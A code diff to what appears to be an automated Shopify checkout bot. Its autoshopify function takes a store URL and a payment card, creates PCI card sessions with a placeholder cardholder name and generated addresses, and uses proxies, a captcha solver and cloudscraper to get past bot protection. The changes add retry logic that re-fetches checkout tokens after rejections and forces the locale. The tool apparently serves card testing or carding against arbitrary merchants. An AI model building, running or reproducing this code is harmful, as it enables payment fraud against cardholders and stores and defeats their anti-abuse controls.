@@ -234,18 +234,40 @@ def _capture_multi(data: str, *pairs) -> Optional[str]:
 
 
 def _extract_running_total_and_currency(checkout_text: str) -> tuple:
-    """Extract amount and currency from runningTotal in checkout page. Returns (amount_str, currency_code) or (None, None)."""
+    """Extract amount and currency from runningTotal/checkoutTotal in checkout page. Returns (amount_str, currency_code) or (None, None)."""
     if not checkout_text:
         return (None, None)
-    # runningTotal&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;200.0&quot;,&quot;currencyCode&quot;:&quot;INR&quot;
+    # Try runningTotal first (HTML-encoded)
     m = re.search(
         r'runningTotal&quot;:\s*\{[^}]*&quot;amount&quot;:\s*&quot;([0-9]+(?:\.[0-9]+)?)&quot;[^}]*&quot;currencyCode&quot;:\s*&quot;([A-Z]{3})&quot;',
         checkout_text,
     )
     if m:
         return (m.group(1), m.group(2))
+    # runningTotal JSON
     m = re.search(
         r'runningTotal["\']:\s*\{[^}]*"amount"\s*:\s*"([0-9]+(?:\.[0-9]+)?)"[^}]*"currencyCode"\s*:\s*"([A-Z]{3})"',
+        checkout_text,
+    )
+    if m:
+        return (m.group(1), m.group(2))
+    # checkoutTotal (HTML-encoded)
+    m = re.search(
+        r'checkoutTotal&quot;:\s*\{[^}]*&quot;amount&quot;:\s*&quot;([0-9]+(?:\.[0-9]+)?)&quot;[^}]*&quot;currencyCode&quot;:\s*&quot;([A-Z]{3})&quot;',
+        checkout_text,
+    )
+    if m:
+        return (m.group(1), m.group(2))
+    # Nested value.amount pattern (common in Shopify checkout)
+    m = re.search(
+        r'&quot;value&quot;:\s*\{[^}]*&quot;amount&quot;:\s*&quot;([0-9]+(?:\.[0-9]+)?)&quot;[^}]*&quot;currencyCode&quot;:\s*&quot;([A-Z]{3})&quot;',
+        checkout_text,
+    )
+    if m:
+        return (m.group(1), m.group(2))
+    # presentmentCurrency + amount nearby
+    m = re.search(
+        r'&quot;amount&quot;:\s*&quot;([0-9]+(?:\.[0-9]+)?)&quot;[^}]{0,200}&quot;currencyCode&quot;:\s*&quot;([A-Z]{3})&quot;',
         checkout_text,
     )
     if m:
@@ -2363,7 +2385,11 @@ async def autoshopify(url, card, session, proxy=None):
             gateway = "Unknown"
         DMT = capture(checkout_text, 'deliveryMethodTypes&quot;:[&quot;', '&quot;],&quot;')
 
-        addr = pick_addr(url, cc=currencyCode, rc=countryCode)
+        # When checkout URL has en-in (India locale), use IN for address to match store (tiefossi DELIVERY_LINE_DETAIL)
+        addr_country = countryCode
+        if checkout_url and ("en-in" in (checkout_url or "").lower() or "en_in" in (checkout_url or "").lower()):
+            addr_country = "IN"
+        addr = pick_addr(url, cc=currencyCode, rc=addr_country)
         # print(addr["postalCode"])
         # print(addr["address1"])
         # print(addr["city"])
@@ -2442,6 +2468,8 @@ async def autoshopify(url, card, session, proxy=None):
         # Currency: runningTotal from page is authoritative (matches payment amount exactly)
         curr_code = (running_total_curr or currencyCode or (low_product.get("currency_code") if low_product else None) or "USD").strip()
         country_code_val = (countryCode or (low_product.get("country_code") if low_product else None) or "US").strip()
+        if checkout_url and ("en-in" in (checkout_url or "").lower() or "en_in" in (checkout_url or "").lower()):
+            country_code_val = "IN"
         # Use page presentment currency for buyerIdentity - must match checkout session (tiefossi: BUYER_IDENTITY_PRESENTMENT_CURRENCY_DOES_NOT_MATCH)
         # presentment_currency_page is from buyerIdentity in page; running_total_curr from runningTotal - prefer page's explicit presentmentCurrency
         api_currency = (low_product.get("currency_code") or "").strip() if low_product else ""
@@ -2679,6 +2707,106 @@ async def autoshopify(url, card, session, proxy=None):
                                     continue
                             except Exception as e:
                                 logger.debug(f"Captcha solver SubmitRejected: {e}")
+                        # Re-fetch checkout on MERCHANDISE_CART_UPDATED_BASED_ON_COUNTRY or DELIVERY_DELIVERY_LINE_DETAIL_CHANGED - state changed, need fresh tokens (tiefossi, etc.)
+                        if any(x in (code or "") for x in ["MERCHANDISE_CART_UPDATED_BASED_ON_COUNTRY", "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED"]) and submit_attempt < 3 and checkout_url:
+                            try:
+                                await asyncio.sleep(2.0)  # Give store time to update cart
+                                fresh_text = None
+                                # Try session.get first; for low_product_flow, session may lack checkout cookies -> use cloudscraper
+                                for _ref in range(2):
+                                    refetch = await session.get(checkout_url, headers={"User-Agent": getua, "Accept": "text/html,application/xhtml+xml,*/*;q=0.9"}, timeout=25)
+                                    if getattr(refetch, "status_code", 0) == 200 and getattr(refetch, "text", None):
+                                        fresh_text = (refetch.text or "").strip()
+                                    if fresh_text and len(fresh_text) > 5000 and "queueToken" in fresh_text and "stableId" in fresh_text:
+                                        break
+                                    # Low-product flow: session may not have checkout cookies; use cloudscraper full flow
+                                    if low_product_flow and HAS_CLOUDSCRAPER and (low_product or {}).get("variantid"):
+                                        vid = low_product.get("variantid")
+                                        cs_sc, cs_text, cs_url = await asyncio.to_thread(_fetch_checkout_via_cloudscraper_full_flow_sync, url, vid, proxy)
+                                        if cs_sc == 200 and cs_text and len(cs_text) > 5000 and "queueToken" in cs_text and "stableId" in cs_text:
+                                            fresh_text = cs_text.strip()
+                                            if cs_url:
+                                                checkout_url = cs_url
+                                            break
+                                    await asyncio.sleep(1.5)
+                                if fresh_text and len(fresh_text) > 5000 and "queueToken" in fresh_text and "stableId" in fresh_text:
+                                        checkout_text = fresh_text
+                                        new_sess = _extract_session_token(fresh_text)
+                                        if new_sess:
+                                            x_checkout_one_session_token = new_sess
+                                            # Cloudscraper refetch = new checkout; create new PCI session
+                                            try:
+                                                pci_r = await session.post(
+                                                    "https://checkout.pci.shopifyinc.com/sessions",
+                                                    headers={
+                                                        "accept": "application/json",
+                                                        "content-type": "application/json",
+                                                        "origin": "https://checkout.pci.shopifyinc.com",
+                                                        "user-agent": getua,
+                                                    },
+                                                    json={
+                                                        "credit_card": {"number": cc, "month": mes, "year": ano, "verification_value": cvv, "start_month": None, "start_year": None, "issue_number": "", "name": "maxine df"},
+                                                        "payment_session_scope": (domain or (urlparse(url).netloc or "").replace("www.", "")),
+                                                    },
+                                                    timeout=18,
+                                                )
+                                                if getattr(pci_r, "status_code", 0) == 200 and getattr(pci_r, "text", None):
+                                                    pj = json.loads(pci_r.text) if (pci_r.text or "").strip().startswith("{") else {}
+                                                    session_id = (pj.get("id") or "").strip() or session_id
+                                                    _pl = (submit_vars.get("input") or {}).get("payment") or {}
+                                                    _plines = _pl.get("paymentLines") or []
+                                                    if _plines and isinstance(_plines[0], dict):
+                                                        _dm = (_plines[0].get("paymentMethod") or {}).get("directPaymentMethod") or {}
+                                                        if _dm is not None:
+                                                            _dm["sessionId"] = session_id
+                                            except Exception:
+                                                pass
+                                        submit_vars["input"]["sessionInput"] = {"sessionToken": x_checkout_one_session_token}
+                                        queue_token = _capture_multi(fresh_text, ('queueToken&quot;:&quot;', '&quot'), ('queueToken":"', '"')) or queue_token
+                                        stable_id = _capture_multi(fresh_text, ('stableId&quot;:&quot;', '&quot'), ('stableId":"', '"')) or stable_id
+                                        presentment_currency_page = _capture_multi(fresh_text, ('presentmentCurrency&quot;:&quot;', '&quot'), ('presentmentCurrency":"', '"')) or presentment_currency_page
+                                        country_from_page = _capture_multi(fresh_text, ('countryCode&quot;:&quot;', '&quot'), ('countryCode":"', '"')) or None
+                                        running_total_amt, running_total_curr = _extract_running_total_and_currency(fresh_text)
+                                        if running_total_amt:
+                                            payment_amount_retry = running_total_amt
+                                        if presentment_currency_page or running_total_curr:
+                                            buyer_presentment = (presentment_currency_page or running_total_curr or buyer_presentment).strip()
+                                        _bi = (submit_vars.get("input") or {}).get("buyerIdentity") or {}
+                                        _cust = _bi.get("customer") or {}
+                                        if _cust:
+                                            _cust["presentmentCurrency"] = buyer_presentment
+                                            if country_from_page and len(country_from_page) == 2:
+                                                cc_up = country_from_page.upper()
+                                                _cust["countryCode"] = cc_up
+                                                country_code_val = cc_up
+                                                _bi["phoneCountryCode"] = cc_up
+                                                _shop = _bi.get("shopPayOptInPhone") or {}
+                                                if isinstance(_shop, dict):
+                                                    _shop["countryCode"] = cc_up
+                                                    _bi["shopPayOptInPhone"] = _shop
+                                        if curr_code and running_total_curr:
+                                            curr_code = running_total_curr
+                                        submit_vars["input"]["queueToken"] = queue_token
+                                        _ml = (submit_vars.get("input") or {}).get("merchandise") or {}
+                                        _mlines = _ml.get("merchandiseLines") or []
+                                        if _mlines and stable_id:
+                                            _mlines[0]["stableId"] = stable_id
+                                            if payment_amount_retry and curr_code:
+                                                _mlines[0]["expectedTotalPrice"] = {"value": {"amount": payment_amount_retry, "currencyCode": curr_code}}
+                                        _del = (submit_vars.get("input") or {}).get("delivery") or {}
+                                        _dlines = _del.get("deliveryLines") or []
+                                        if _dlines and stable_id:
+                                            _dlines[0]["targetMerchandiseLines"] = {"lines": [{"stableId": stable_id}]}
+                                            if payment_amount_retry and curr_code and not non_shipping_flow:
+                                                _dlines[0]["expectedTotalPrice"] = {"value": {"amount": payment_amount_retry, "currencyCode": curr_code}}
+                                        _pl = (submit_vars.get("input") or {}).get("payment") or {}
+                                        _plines = _pl.get("paymentLines") or []
+                                        if _plines and payment_amount_retry and curr_code:
+                                            _plines[0]["amount"] = {"value": {"amount": payment_amount_retry, "currencyCode": curr_code}}
+                                        logger.info("Re-fetched checkout for MERCHANDISE_CART/DELIVERY_LINE_DETAIL_CHANGED")
+                                        continue
+                            except Exception as e:
+                                logger.debug(f"MERCHANDISE_CART re-fetch: {e}")
                         # Retry with alternate presentment currency on BUYER_IDENTITY_PRESENTMENT_CURRENCY_DOES_NOT_MATCH (tiefossi, etc.)
                         if "BUYER_IDENTITY_PRESENTMENT_CURRENCY_DOES_NOT_MATCH" in (code or "") and submit_attempt < 2:
                             alt_curr = "INR" if (buyer_presentment or "").upper() == "USD" else "USD"
